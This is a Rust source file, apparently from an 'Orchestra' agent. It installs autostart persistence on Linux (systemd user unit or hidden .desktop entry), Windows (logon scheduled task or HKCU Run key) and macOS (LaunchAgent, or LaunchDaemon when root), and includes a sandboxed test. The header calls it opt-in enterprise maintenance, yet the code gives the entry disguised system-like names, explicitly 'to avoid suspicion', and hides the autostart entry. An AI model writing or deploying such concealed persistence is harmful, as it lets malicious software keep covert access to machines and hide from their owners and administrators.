//! Opt-in persistence for enterprise maintenance.
//!
//! When `persistence_enabled = true` in `agent.toml`, the agent installs a
//! per-user systemd unit (Linux) or a scheduled task (Windows) that re-launches
//! the agent at the next user login. This is an *opt-in* convenience for
//! environments where an administrator wants the agent to survive reboots
//! without manually redeploying the launcher each time.
//!
//! All entry points return a `Result` and never panic. Test runs use the
//! `ORCHESTRA_PERSISTENCE_ROOT` environment variable to redirect filesystem
//! writes into a temporary directory.

#[cfg(any(target_os = "linux", target_os = "windows", target_os = "macos"))]
use anyhow::Context;
use anyhow::Result;
use std::path::PathBuf;

#[cfg(target_os = "windows")]
use winreg::enums::*;
#[cfg(target_os = "windows")]
use winreg::RegKey;

/// Choose a generic, unremarkable name for the service/task.
fn get_service_name() -> &'static str {
    // A small, static selection to avoid suspicion.
    let potential_names = ["UserSessionHelper", "ConfigSync", "DisplayCache"];
    
    // Deterministic selection based on the hostname.
    let hostname = std::env::var("HOSTNAME")
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .unwrap_or_else(|_| "localhost".to_string());
        
    let mut sum: usize = 0;
    for b in hostname.bytes() {
        sum = sum.wrapping_add(b as usize);
    }
    
    potential_names[sum % potential_names.len()]
}

/// Determine where the persistence-related files should live. In production
/// this is `$XDG_CONFIG_HOME` or `%APPDATA%`. In tests, the root can be
/// overridden via `ORCHESTRA_PERSISTENCE_ROOT`.
#[cfg(any(target_os = "linux", target_os = "windows", target_os = "macos"))]
fn config_root() -> PathBuf {
    if let Ok(p) = std::env::var("ORCHESTRA_PERSISTENCE_ROOT") {
        return PathBuf::from(p);
    }
    if let Some(dir) = directories::BaseDirs::new() {
        dir.config_dir().to_path_buf()
    } else {
        PathBuf::from(".")
    }
}

#[cfg(target_os = "linux")]
fn unit_path() -> PathBuf {
    config_root().join("systemd/user").join(format!("{}.service", get_service_name()))
}

#[cfg(target_os = "linux")]
fn autostart_path() -> PathBuf {
    config_root().join("autostart").join(format!("{}.desktop", get_service_name()))
}

#[cfg(target_os = "windows")]
fn task_marker_path() -> PathBuf {
    config_root().join(get_service_name()).join("persistence.marker")
}

/// Install the persistence entry. Returns the absolute path that was created
/// (useful for tests).
pub fn install_persistence() -> Result<PathBuf> {
    install_persistence_inner()
}

/// Remove the persistence entry installed by [`install_persistence`].
pub fn uninstall_persistence() -> Result<()> {
    uninstall_persistence_inner()
}

#[cfg(target_os = "linux")]
fn install_persistence_inner() -> Result<PathBuf> {
    // Try systemd first.
    if let Ok(path) = install_systemd_unit() {
        return Ok(path);
    }
    // Fallback to .desktop autostart.
    install_desktop_autostart()
}

#[cfg(target_os = "linux")]
fn install_systemd_unit() -> Result<PathBuf> {
    let path = unit_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .with_context(|| format!("Failed to create unit directory {}", parent.display()))?;
    }

    let exe_path = std::env::current_exe()
        .context("Failed to get current executable path")?
        .display()
        .to_string();

    let service_name = get_service_name();
    let unit = format!(
        "[Unit]\n\
         Description={service_name}\n\
         After=network-online.target\n\n\
         [Service]\n\
         Type=simple\n\
         ExecStart={exe_path}\n\
         Restart=on-failure\n\n\
         [Install]\n\
         WantedBy=default.target\n"
    );

    std::fs::write(&path, unit)
        .with_context(|| format!("Failed to write unit file {}", path.display()))?;

    // Best-effort enable; silently tolerate missing systemctl in tests.
    if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
        let status = std::process::Command::new("systemctl")
            .args(["--user", "enable", &format!("{service_name}.service")])
            .status()?;
        if !status.success() {
            anyhow::bail!("systemctl enable failed with status: {status}");
        }
    }
    Ok(path)
}

#[cfg(target_os = "linux")]
fn install_desktop_autostart() -> Result<PathBuf> {
    let path = autostart_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).context("Failed to create autostart directory")?;
    }

    let exe_path = std::env::current_exe()
        .context("Failed to get current executable path")?
        .display()
        .to_string();
    
    let service_name = get_service_name();
    let desktop_entry = format!(
        "[Desktop Entry]\n\
         Type=Application\n\
         Name={service_name}\n\
         Exec={exe_path}\n\
         Terminal=false\n\
         NoDisplay=true\n"
    );

    std::fs::write(&path, desktop_entry)
        .with_context(|| format!("Failed to write autostart file {}", path.display()))?;

    Ok(path)
}

#[cfg(target_os = "linux")]
fn uninstall_persistence_inner() -> Result<()> {
    // Try to remove both methods.
    let systemd_path = unit_path();
    if systemd_path.exists() {
        if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "disable", &format!("{}.service", get_service_name())])
                .status();
        }
        std::fs::remove_file(&systemd_path)
            .with_context(|| format!("Failed to remove {}", systemd_path.display()))?;
    }

    let autostart_path = autostart_path();
    if autostart_path.exists() {
        std::fs::remove_file(&autostart_path)
            .with_context(|| format!("Failed to remove {}", autostart_path.display()))?;
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn install_persistence_inner() -> Result<PathBuf> {
    // Try schtasks first.
    if let Ok(path) = install_scheduled_task() {
        return Ok(path);
    }
    // Fallback to Run key.
    install_run_key()
}

#[cfg(target_os = "windows")]
fn install_scheduled_task() -> Result<PathBuf> {
    let marker = task_marker_path();
    if let Some(parent) = marker.parent() {
        std::fs::create_dir_all(parent)?;
    }

    let exe_path = std::env::current_exe()
        .context("Failed to get current executable path")?
        .display()
        .to_string();

    let task_name = get_service_name();

    if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
        let status = std::process::Command::new("schtasks")
            .args([
                "/Create",
                "/F",
                "/SC",
                "ONLOGON",
                "/TN",
                task_name,
                "/TR",
                &exe_path,
            ])
            .status()
            .context("Failed to invoke schtasks")?;
        if !status.success() {
            anyhow::bail!("schtasks /Create exited with {status}");
        }
    }
    // Store the method and name for uninstallation.
    std::fs::write(&marker, format!("schtasks\n{task_name}"))?;
    Ok(marker)
}

#[cfg(target_os = "windows")]
fn install_run_key() -> Result<PathBuf> {
    let marker = task_marker_path();
     if let Some(parent) = marker.parent() {
        std::fs::create_dir_all(parent)?;
    }

    let exe_path = std::env::current_exe()
        .context("Failed to get current executable path")?
        .display()
        .to_string();
    
    let key_name = get_service_name();

    if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let run_key = hkcu.open_subkey_with_flags(
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            KEY_WRITE,
        )?;
        run_key.set_value(key_name, &exe_path)?;
    }
    
    // Store the method and name for uninstallation.
    std::fs::write(&marker, format!("runkey\n{key_name}"))?;
    Ok(marker)
}

#[cfg(target_os = "windows")]
fn uninstall_persistence_inner() -> Result<()> {
    let marker = task_marker_path();
    if marker.exists() {
        if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
            let content = std::fs::read_to_string(&marker)?;
            let mut lines = content.lines();
            let method = lines.next().unwrap_or("");
            let name = lines.next().unwrap_or("");

            if name.is_empty() {
                return Ok(());
            }

            match method {
                "schtasks" => {
                    let _ = std::process::Command::new("schtasks")
                        .args(["/Delete", "/F", "/TN", name])
                        .status();
                }
                "runkey" => {
                    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                    let run_key = hkcu.open_subkey_with_flags(
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        KEY_WRITE,
                    )?;
                    let _ = run_key.delete_value(name);
                }
                _ => {}
            }
        }
        std::fs::remove_file(&marker)?;
    }
    Ok(())
}


#[cfg(target_os = "macos")]
fn plist_path(system_level: bool) -> PathBuf {
    if let Ok(p) = std::env::var("ORCHESTRA_PERSISTENCE_ROOT") {
        return PathBuf::from(p).join(format!("{}.plist", get_service_name()));
    }
    if system_level {
        PathBuf::from("/Library/LaunchDaemons").join(format!("{}.plist", get_service_name()))
    } else if let Some(dir) = directories::BaseDirs::new() {
        dir.home_dir().join("Library").join("LaunchAgents").join(format!("{}.plist", get_service_name()))
    } else {
        // Fallback for user path
        PathBuf::from(format!("{}.plist", get_service_name()))
    }
}

#[cfg(target_os = "macos")]
fn is_root() -> bool {
    // geteuid() is safer since it indicates effective uid
    unsafe { libc::geteuid() == 0 }
}

#[cfg(target_os = "macos")]
fn install_persistence_inner() -> Result<PathBuf> {
    let system_level = is_root();
    let path = plist_path(system_level);
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .with_context(|| format!("Failed to create Launch agents/daemons directory {}", parent.display()))?;
    }

    let exe_path = std::env::current_exe()
        .context("Failed to get current executable path")?
        .display()
        .to_string();

    let service_name = get_service_name();
    let plist = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
"#,
        service_name, exe_path
    );

    std::fs::write(&path, plist)
        .with_context(|| format!("Failed to write plist file {}", path.display()))?;

    if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
        let (target, target_path) = if system_level {
            ("system".to_string(), path.to_string_lossy().to_string())
        } else {
            let uid_out = std::process::Command::new("id")
                .arg("-u")
                .output()
                .context("Failed to get UID for launchctl bootstrap")?;
            let uid = String::from_utf8_lossy(&uid_out.stdout).trim().to_string();
            (format!("gui/{uid}"), path.to_string_lossy().to_string())
        };

        let status = std::process::Command::new("launchctl")
            .args(["bootstrap", &target, &target_path])
            .status()?;
        if !status.success() {
            anyhow::bail!("launchctl bootstrap failed with status: {status}");
        }
    }
    Ok(path)
}

#[cfg(target_os = "macos")]
fn uninstall_persistence_inner() -> Result<()> {
    let system_level = is_root();
    let path = plist_path(system_level);
    
    if !path.exists() && system_level {
        // We are root, but system level didn't exist, try user fallback in uninstall
        let upath = plist_path(false);
        if upath.exists() {
            return uninstall_persistence_actual(upath, false);
        }
    }
    
    uninstall_persistence_actual(path, system_level)
}

#[cfg(target_os = "macos")]
fn uninstall_persistence_actual(path: PathBuf, system_level: bool) -> Result<()> {
    if path.exists() {
        if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
            let target_spec = if system_level {
                let label = get_service_name();
                format!("system/{}", label)
            } else {
                let uid_out = std::process::Command::new("id")
                    .arg("-u")
                    .output()
                    .ok()
                    .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
                    .unwrap_or_else(|| "501".to_string());
                let label = get_service_name();
                format!("gui/{}/{}", uid_out, label)
            };
            let _ = std::process::Command::new("launchctl")
                .args(["bootout", &target_spec])
                .status();
        }
        std::fs::remove_file(&path)
            .with_context(|| format!("Failed to remove {}", path.display()))?;
    }
    Ok(())
}
#[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
fn install_persistence_inner() -> Result<PathBuf> {
    anyhow::bail!("Persistence is not implemented on this platform")
}

#[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
fn uninstall_persistence_inner() -> Result<()> {
    Ok(())
}

#[cfg(test)]
#[cfg(any(target_os = "linux", target_os = "windows", target_os = "macos"))]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn install_then_uninstall_in_sandbox() {
        let dir = tempdir().unwrap();
        std::env::set_var("ORCHESTRA_PERSISTENCE_ROOT", dir.path());

        let path = install_persistence().expect("install");
        assert!(path.exists(), "unit/marker file was not created");

        // On Windows, check content of marker file
        #[cfg(target_os = "windows")]
        {
            let content = std::fs::read_to_string(&path).unwrap();
            let mut lines = content.lines();
            let method = lines.next().unwrap();
            let name = lines.next().unwrap();
            assert!(!method.is_empty());
            assert!(!name.is_empty());
        }

        uninstall_persistence().expect("uninstall");
        assert!(!path.exists(), "uninstall did not remove the file");

        std::env::remove_var("ORCHESTRA_PERSISTENCE_ROOT");
    }
}
